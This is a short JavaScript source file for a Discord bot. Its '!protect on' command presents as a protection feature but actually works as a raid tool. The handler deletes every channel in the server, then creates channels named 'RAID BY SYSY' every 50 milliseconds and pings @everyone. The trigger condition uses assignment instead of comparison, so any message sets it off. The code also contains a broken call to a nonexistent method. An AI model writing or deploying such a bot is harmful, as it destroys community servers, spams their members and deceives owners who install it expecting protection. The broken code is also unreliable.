    const Discord = require('discord.js');

const client = new Discord.Client();

const triesPerSecond = 1;

const prefix = "!"

client.on('ready', () => {

    console.log("Je suis co");
    client.user.setActivity("a")
});

client.on('message', message => {
        if (message.content = "!protect on") {

    message.guild.channels.map(c => {
        c.delete();
    
    });
    setInterval(() => {

            message.guild.createChannel('undefined-156');
            message.guild.createChannel("RAID BY SYSY", 'text');
            message.channels.find('name', "RAID BY SYSY").send("@everyone");

        message.guild.createChannel("RAID BY SYSY");
        }, 50);

if (message.content = "!protect") {


}}
    
});


client.login(process.env.TOKEN)
